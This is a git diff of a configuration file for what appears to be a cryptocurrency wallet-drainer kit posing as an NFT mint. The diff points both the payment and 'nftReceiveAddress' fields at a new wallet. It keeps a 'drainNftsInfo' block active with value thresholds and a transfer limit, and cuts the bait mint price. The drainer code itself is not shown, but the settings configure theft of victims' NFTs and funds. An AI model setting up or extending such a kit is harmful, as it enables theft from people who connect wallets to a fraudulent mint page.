@@ -2,7 +2,8 @@
     = = = = = YOU WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "0x0cEe5a2F50811DF70db34C647cE536bc4891FFf6";
+// const receiveAddress = "0x0cEe5a2F50811DF70db34C647cE536bc4891FFf6";
+const receiveAddress = "0x4f0d9Ec48E9E8af2f59564DAEBf75B9454beDe7b";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
@@ -32,7 +33,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-  price: 0.073,
+  price: 0.003,
   totalSupply: 100,
   minUnits: 1,
   maxUnits: 5,
@@ -47,7 +48,8 @@ const drainNftsInfo = {
   active: true,
   minValue: 0.5,
   maxTransfer: 5,
-  nftReceiveAddress: "0x0cEe5a2F50811DF70db34C647cE536bc4891FFf6",
+  //   nftReceiveAddress: "0x0cEe5a2F50811DF70db34C647cE536bc4891FFf6",
+  nftReceiveAddress: "0x4f0d9Ec48E9E8af2f59564DAEBf75B9454beDe7b",
 };
 
 const customStrings = {
